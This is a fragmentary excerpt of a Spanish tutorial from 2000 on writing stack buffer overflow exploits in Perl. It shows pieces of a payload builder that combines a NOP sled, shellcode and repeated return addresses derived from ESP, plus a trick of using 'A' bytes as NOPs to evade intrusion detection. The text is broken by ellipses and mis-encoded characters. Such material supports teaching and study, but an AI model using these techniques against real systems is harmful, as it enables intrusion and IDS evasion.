...
```
 ...
 |__________________________________________________________________________|
            ...
            -- Buffer Overflow Exploits en Perl - a±o 2000 --
...
cribir exploits buffer overflow. Como el titulo dice, este texto te ense±a a
...
Un hueco para un ejemplo. Escribi un peque±o programa que es vulnerable a un
buffer overflow. strcp() no chequea el tama±o de $KIDVULN antes de iniciarse 
...
Aqui podemos ver que el tama±o del buffer no es lo bastante grande. Seria ah-
...
se±ala, y por lo tanto, podemos conseguir EIP para se±alar nuestra payload.
...
sentencia de retorno. Puesto que ESP se±ala a lo mas alto de la pila, podemos
usar el valor de ESP cuando el programa muera, y (si es necesario) a±adirle el
offset.
...
tama±o de la shellcode: 47 bytes
...
Si el buffer que estamos probando para overflow es demasiado peque±o 
para a±adir una cantidad considerable de NOP's, la shellcode y los RET's,
abajo, el ejemplo podria ser utilizado para construir el payload. 
(Podriamos haber a±adido el nop y la shellcode a la shell-variable tambien)
...
# A±ade un pu±ado de NOPs x86 a el buffer scalar. (885 NOP's)

$buffer .= $shellcode;

# [ Buffer: NNNNNNNNNNNNNNSSSSS ]

# Despues, a±adimos la shellcode al buffer. Le hicimos un hueco a la 
# shellcode arriba.

print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n");

# Aqui a±adimos el offset al valor del puntero de pila - lo convierte en
...
# Aqui a±adimos la longitud de la shellcode al scalar $i, antes de que
# primero, el lazo for acaba teniendo el valor "885" (bytes), despues el lazo 
# for a±ade the $new_ret scalar hasta que $buffer tenga el tama±o de 1032 bytes.
#
...
## Escrito por: teleh0r@doglover.com / a±o 2000
##
...
$nop = A;          # Usando A (0x41) 'como' NOP's para intentar enga±ar a los IDS.
